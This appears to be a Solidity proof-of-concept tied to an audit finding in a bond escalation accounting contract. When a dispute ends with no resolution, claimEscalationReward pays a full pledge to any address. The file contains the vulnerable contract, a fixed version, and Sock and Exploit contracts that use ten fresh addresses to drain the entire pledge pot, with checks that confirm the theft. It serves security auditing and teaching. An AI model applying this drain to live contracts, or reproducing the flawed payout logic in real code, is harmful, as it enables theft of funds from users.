// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Wonderland Prophet — Trail of Bits, May 2024.
    claimEscalationReward pays one full pledge to any address when the
    dispute status is NoResolution, even if that address never pledged.
    Ten fresh addresses drain the 1,000 token pledge pot, 100 each.
*/

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IOracle {
    enum DisputeStatus {
        None,
        Active,
        Won,
        Lost,
        NoResolution
    }

    function disputeStatus(bytes32 disputeId) external view returns (DisputeStatus);
}

interface IBondEscalationModule {
    function pledgesForDispute(bytes32 requestId, address pledger) external view returns (uint256);
    function pledgesAgainstDispute(bytes32 requestId, address pledger) external view returns (uint256);
}

contract Token is IERC20 {
    string public symbol = "BOND";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Oracle is IOracle {
    mapping(bytes32 => DisputeStatus) public statusOf;

    function setStatus(bytes32 disputeId, DisputeStatus status) external {
        statusOf[disputeId] = status;
    }

    function disputeStatus(bytes32 disputeId) external view returns (DisputeStatus) {
        return statusOf[disputeId];
    }
}

contract EscalationModule is IBondEscalationModule {
    function pledgesForDispute(bytes32, address) external pure returns (uint256) {
        return 0;
    }

    function pledgesAgainstDispute(bytes32, address) external pure returns (uint256) {
        return 0;
    }
}

contract BondEscalationAccounting {
    struct EscalationResult {
        IERC20 token;
        bytes32 requestId;
        uint256 amountPerPledger;
        IBondEscalationModule bondEscalationModule;
    }

    error BondEscalationAccounting_NoEscalationResult();
    error BondEscalationAccounting_AlreadyClaimed();

    IOracle public ORACLE;
    mapping(bytes32 => EscalationResult) public escalationResults;
    mapping(bytes32 => mapping(address => bool)) public pledgerClaimed;
    mapping(address => mapping(IERC20 => uint256)) public balanceOf;
    mapping(bytes32 => mapping(IERC20 => uint256)) public pledges;

    constructor(IOracle oracle) {
        ORACLE = oracle;
    }

    function setResult(
        bytes32 disputeId,
        IERC20 token,
        bytes32 requestId,
        uint256 amountPerPledger,
        IBondEscalationModule module,
        uint256 pot
    ) external {
        escalationResults[disputeId] = EscalationResult(token, requestId, amountPerPledger, module);
        pledges[disputeId][token] = pot;
    }

    function claimEscalationReward(bytes32 _disputeId, address _pledger) external virtual {
        EscalationResult memory _result = escalationResults[_disputeId];
        if (_result.token == IERC20(address(0))) revert BondEscalationAccounting_NoEscalationResult();
        bytes32 _requestId = _result.requestId;
        if (pledgerClaimed[_requestId][_pledger]) revert BondEscalationAccounting_AlreadyClaimed();
        IOracle.DisputeStatus _status = ORACLE.disputeStatus(_disputeId);
        uint256 _amountPerPledger = _result.amountPerPledger;
        uint256 _numberOfPledges;
        if (_status == IOracle.DisputeStatus.NoResolution) {
            // @> VULN: NoResolution credits one pledge to any address, pledged or not
            _numberOfPledges = 1;
        } else {
            _numberOfPledges = _status == IOracle.DisputeStatus.Won
                ? _result.bondEscalationModule.pledgesForDispute(_requestId, _pledger)
                : _result.bondEscalationModule.pledgesAgainstDispute(_requestId, _pledger);
        }
        IERC20 _token = _result.token;
        uint256 _claimAmount = _amountPerPledger * _numberOfPledges;
        pledgerClaimed[_requestId][_pledger] = true;
        balanceOf[_pledger][_token] += _claimAmount;
        unchecked {
            pledges[_disputeId][_token] -= _claimAmount;
        }
    }

    function withdraw(address token) external {
        IERC20 t = IERC20(token);
        uint256 amt = balanceOf[msg.sender][t];
        balanceOf[msg.sender][t] = 0;
        if (amt > 0) require(t.transfer(msg.sender, amt), "pay");
    }
}

contract BondEscalationAccountingFixed is BondEscalationAccounting {
    constructor(IOracle oracle) BondEscalationAccounting(oracle) {}

    function claimEscalationReward(bytes32 _disputeId, address _pledger) external override {
        EscalationResult memory _result = escalationResults[_disputeId];
        if (_result.token == IERC20(address(0))) revert BondEscalationAccounting_NoEscalationResult();
        bytes32 _requestId = _result.requestId;
        if (pledgerClaimed[_requestId][_pledger]) revert BondEscalationAccounting_AlreadyClaimed();
        uint256 _numberOfPledges = _result.bondEscalationModule.pledgesForDispute(_requestId, _pledger)
            + _result.bondEscalationModule.pledgesAgainstDispute(_requestId, _pledger);
        IERC20 _token = _result.token;
        uint256 _claimAmount = _result.amountPerPledger * _numberOfPledges;
        pledgerClaimed[_requestId][_pledger] = true;
        balanceOf[_pledger][_token] += _claimAmount;
        unchecked {
            pledges[_disputeId][_token] -= _claimAmount;
        }
    }
}

contract Sock {
    function take(BondEscalationAccounting acct, bytes32 dispute, address token) external {
        acct.claimEscalationReward(dispute, address(this));
        acct.withdraw(token);
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) require(IERC20(token).transfer(msg.sender, bal), "fwd");
    }
}

contract Exploit {
    bytes32 public constant DISPUTE = keccak256("no-resolution-dispute");
    bytes32 public constant REQUEST = keccak256("request");

    Token public token;
    Oracle public oracle;
    EscalationModule public module;
    BondEscalationAccounting public acct;
    Sock[] public socks;
    uint256 public potBefore;
    uint256 public stolen;

    constructor() {
        token = new Token();
        oracle = new Oracle();
        module = new EscalationModule();
        acct = new BondEscalationAccounting(oracle);
        oracle.setStatus(DISPUTE, IOracle.DisputeStatus.NoResolution);
        acct.setResult(DISPUTE, token, REQUEST, 100 ether, module, 1000 ether);
        token.mint(address(acct), 1000 ether);
        for (uint256 i = 0; i < 10; i++) {
            socks.push(new Sock());
        }
    }

    function run() external {
        potBefore = token.balanceOf(address(acct));
        for (uint256 i = 0; i < socks.length; i++) {
            socks[i].take(acct, DISPUTE, address(token));
        }
        stolen = token.balanceOf(address(this));
        require(potBefore == 1000 ether, "pot");
        require(stolen == 1000 ether, "stolen");
        require(token.balanceOf(address(acct)) == 0, "left");
        require(acct.pledges(DISPUTE, token) == 0, "pledges");
    }
}
